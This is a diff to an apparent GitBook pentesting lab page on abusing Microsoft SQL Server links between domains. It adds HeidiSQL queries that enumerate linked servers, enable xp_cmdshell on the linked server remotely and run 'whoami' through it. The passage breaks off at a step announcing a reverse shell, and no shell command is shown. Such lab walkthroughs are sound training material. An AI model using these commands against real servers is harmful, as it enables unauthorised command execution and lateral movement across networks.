@@ -105,7 +105,7 @@ python3 -m http.server 8090
 Get-SQLInstanceDomain | Get-SQLServerLink.
 ```
 
-![](<../../../.gitbook/assets/afbeelding (36).png>)
+![](<../../../.gitbook/assets/afbeelding (38).png>)
 
 4\. The output shows that `web01.amsterdam.bank.local` has a SQL Server link to `DATA01.secure.local`.  A link that is to another domain. The output also shows that rpc\_out is enabled. With the cmdlet `Get-SQLServerLinkCrawl` we can execute a query through the linked servers.&#x20;
 
@@ -123,7 +123,7 @@ We wont see the data from the SQL Query since its wrapped into the `CustomQuery`
 Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryTarget DATA01\DATA | Select-Object -ExpandProperty CustomQuery
 ```
 
-![](<../../../.gitbook/assets/afbeelding (44).png>)
+![](<../../../.gitbook/assets/afbeelding (49).png>)
 
 #### Connecting with HeidiSQL
 
@@ -141,37 +141,50 @@ Get-SQLInstanceDomain | Get-SQLServerLinkCrawl -Query 'select @@version' -QueryT
 
 4\. Click "OK" on the security Issue warning.
 
+5\. In the "Query" tab fill in the following to query the SQL Links:
 
+```
+SELECT * FROM master..sysservers;
+```
 
+![](<../../../.gitbook/assets/afbeelding (26).png>)
 
+6\. We discovered the same SQL server link as earlier. We can query the server with the following query:
 
+```
+SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'select @@version');
+```
 
+![](<../../../.gitbook/assets/afbeelding (36).png>)
 
+7\. We can query the server to check if `xp_cmdshell` is on:
 
+```
+SELECT * FROM OPENQUERY("DATA01.SECURE.LOCAL", 'SELECT * FROM sys.configurations WHERE name = ''xp_cmdshell''');
+```
 
+![](<../../../.gitbook/assets/afbeelding (19).png>)
 
+8\. The value `0` means xp\_cmdshell is disabled. We can try to enable xp\_cmdshell with the following queries:
 
+```
+EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT "DATA01.SECURE.LOCAL"
+EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT "DATA01.SECURE.LOCAL"
+```
 
+9\. When we check if xp\_cmdshell is enabled we see it is enabled now.
 
+![](<../../../.gitbook/assets/afbeelding (46).png>)
 
+10\. We can execute commands using the EXECUTE function.
 
+```
+EXECUTE('exec master..xp_cmdshell ''whoami''') AT "DATA01.SECURE.LOCAL"
+```
 
+![](<../../../.gitbook/assets/afbeelding (44).png>)
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+11\. We could get a reverse shell by executing the following query:
 
 
 
